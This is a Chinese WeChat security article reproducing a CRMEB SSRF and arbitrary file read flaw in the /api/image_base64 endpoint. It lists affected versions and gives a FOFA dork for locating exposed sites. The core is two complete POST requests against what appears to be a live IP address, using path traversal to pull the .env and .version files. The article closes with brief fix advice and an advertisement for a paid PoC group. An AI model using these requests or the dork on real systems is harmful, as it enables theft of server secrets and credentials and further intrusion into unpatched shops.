---
title: CRMEB-image_base64-任意文件读取+SSRF
url: https://mp.weixin.qq.com/s/GhXsrUHWc_O3sPVsz7dQWg
source: Doonsec's feed
date: 2026-10-08
fetch_date: 2026-10-09T08:09:55.244814
---

# CRMEB-image_base64-任意文件读取+SSRF

# CRMEB-image\_base64-任意文件读取+SSRF

原创

北雪网络安全
北雪网络安全

北雪网络安全

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzgMlD4icXnO0EP6Eic3tBHgnuNg0NK70HRc1orLNgJ6aabiatUL3RLpibtGxTPw71oZBPpk5MXEV4bFMpXxvMgkwB8IUhBtnID2lRo/640?wx_fmt=png&from=appmsg)

网络安全为人民，网络安全靠人民

![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzgDSVQRycdk8dSeIcIkBGm6ZhlkqCGjCAKaK6tVsgp8IPmThjicDNgJPrOtwCwH1ZugzTmCSWvJ2yluFDiblnBVEk67ibtAOmXvr4/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzgL6EaBQ4Tn158rm8KlpzSKE5QdL6ETb0GSqqkIg2ZlKcZVXaBrcsVkSg2ve5zYBrXALWosDKkUElDibdhHCPeosScMAnwGzFbE/640?wx_fmt=png&from=appmsg)

**本文章所描述的内容仅供网络安全学习使用，任何人不允许学到技术内容进行非法系统测试，作者不对任何学习文章并进行非法操作的行为负责，由本人自己承担后果，本文章仅供技术学习。**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzj3nwCqAib3prRg6UlQdndzFv2R4jCLNupcqL3WtmsPpKevVRXEDRYiaDzXIUGcEW1cKcjhtUZMG1tv8W5jiajVfPkfk1l9b62wpk/640?wx_fmt=png&from=appmsg)

01

更多内容

#### 网络安全学习知识库每日添加最新漏洞并提供python与 nuclei 批量探测脚本：https://pc.fenchuan8.com/#/index?forum=110296

02

搜索引擎

fofa：body="/wap/first/zsff/iconfont/iconfont.css" || body="CRMEB"

03

漏洞复现

影响版本：v3.2.8 ~ v5.1.0（SSRF）；v5.2.2 ~ v5.6.3.1(SSRF+任意文件)；v6.0.0 ~ v6.0.1(SSRF+任意文件)

![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSziaBr4sKgHF27xpOPHA6D8n77pQAzxsYYYIdz7F7EfSzx7kWiboibaEQUJhU1DKEHqQMdPLaKkUsWxVMic1s2AFsPXMNznRZbqHvuc/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzhfBcmsBbhIQIthDcvMPXV6TZSQWcC1cQ1dI1jlpT0fSkrpdZYicdiaDuN5XvA6yn7XZt3bGjsT3EicBzicww1jSWiasxv1GGTO9nnw/640?wx_fmt=png&from=appmsg)

```
POST /api/image_base64 HTTP/1.1Host: 123.207.15.44User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:157.0) Gecko/20100101 Firefox/157.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateConnection: closeCookie: auth.strategy=local; cb_lang=zh-cn; PHPSESSID=fbc0f9817732e7272e9d8559b7cff4a0;logo=http%3A%2F%2F123.207.15.44%2Fstatics%2Fsystem_images%2Fpc_logo.png;titles=%E5%8D%97%E6%96%B9%E9%9F%B5%E5%92%8C%E5%A4%A7%E5%AE%A2%E6%88%B7%E5%86%85%E9%83%A8%E8%AE%A2%E8%B4%A7%E7%B3%BB%E7%BB%9F-%E7%88%B1%E5%BF%83%E6%99%BA%E6%85%A7%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8;fromPath=%2Fabout_us; unreadKefu=0Upgrade-Insecure-Requests: 1Priority: u=0, iContent-Length: 40
image=http://123.207.15.44/../.env&code=
```

![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzgwa4JFRicUDdibRXBbmeZg2cglFQxdQ5tAcXkFmw8frlPwwHXamp1fLCfUDW3ynh33tAzqZ6neOJEBeALENNRFnsFnY7VODfR8s/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzgZMXZ6BjlsncR50n8d7ygWqDEhCJDAD1mAS3M9ria6fLLTzcvwxXViab0F1IibMnNqj3XSz3Pa9EyA87IcAERrvlRcUZz5zMVicsM/640?wx_fmt=png&from=appmsg)

```
POST /api/image_base64 HTTP/1.1Host: 123.207.15.44User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:157.0) Gecko/20100101 Firefox/157.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateConnection: closeCookie: auth.strategy=local; cb_lang=zh-cn; PHPSESSID=fbc0f9817732e7272e9d8559b7cff4a0;logo=http%3A%2F%2F123.207.15.44%2Fstatics%2Fsystem_images%2Fpc_logo.png;titles=%E5%8D%97%E6%96%B9%E9%9F%B5%E5%92%8C%E5%A4%A7%E5%AE%A2%E6%88%B7%E5%86%85%E9%83%A8%E8%AE%A2%E8%B4%A7%E7%B3%BB%E7%BB%9F-%E7%88%B1%E5%BF%83%E6%99%BA%E6%85%A7%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8;fromPath=%2Fabout_us; unreadKefu=0Upgrade-Insecure-Requests: 1Priority: u=0, iContent-Length: 40
image=http://123.207.15.44/../.version&code=
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzgALXJBdiaJYWXVXpwy5DBjhaQVyib7NMHkeQ3VyjogC6OXrIl5RlibLYGFsF6Kb3QM3Odib2qryFsZibiahCt7yib1bHuStsB0lzfYic8/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzgu6ibj2oYedmk9d4hnkicuic8QQm3xbxXKn7rxPBxmx2d1zGzULF9CfESlfejiak5450JrbiboKy90iaibV1s1b5CRECK0LwX1H7Kr3I/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSziak7rTuEsmIT1tE0bhOsbqRSQLlNiapibRIXvaecib3cbRaUOyueps7cRfIy50HsGxybD8zoGM0yReJFaA8zWNhvGjQUIDm1sJYnU/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzgVESaNnDzvw4hjKia80yW25hjSHYicvbKiaFCfL8VhZjNicoxNTibkiaiaCoFpMry1u7HTEh48ica7Tj9k83OJliar2NeWlcVTEQch5GLw/640?wx_fmt=png&from=appmsg)

04

修复建议

1、关闭互联网暴露面或接口设置访问权限

2、升级至安全版本

05

内部圈子

🛠️ 【知名漏洞实战圈，纯干货】🛠️

还在找公开漏洞POC而烦恼？还在为漏洞不会验证而发愁？还在为发现不了漏洞而自卑？这里漏洞圈子解决你的困惑！
目前已更新poc数量2500+

![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzjhFYZuiaibkJ3bo1hyicm1nHrGHnelM2DovvCu9kKJXjPS28awpVmuvKiaCWh1jOlZj06xv79qAIiaYG2enaT0OBxGvchEYIibkNLYA/640?wx_fmt=png&from=appmsg)

🎯 适用场景

**▫️渗透测试**▫️企业漏洞自查****▫️****攻防演练****▫️****安全服务****▫️****合规运营****

****![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSziaibJZnM6To4Vl1YX42qHfCa6PiaCCaDVY1icc840xX0QenLum19hcEsDW68PYwJtl1JchgAibJAB6yJ2sXEicGwXtlfMZ3Oaqzm99g/640?wx_fmt=png&from=appmsg)****

**▫️微信扫一扫进入付费圈子查看更多漏洞内容。**

****▫️**全民掌握网安技能，共守智能时代晴空。**

预览时标签不可点

不喜欢

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzjnJSMCbXtribgZvAJkvYkoOvpBvPF0qhoF9YzA6fEqEfv9BgW7zHvsKKlzrgAFaGiaMSJk9eObsFyRqjoKl6QuVVC65jmCxZnSQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过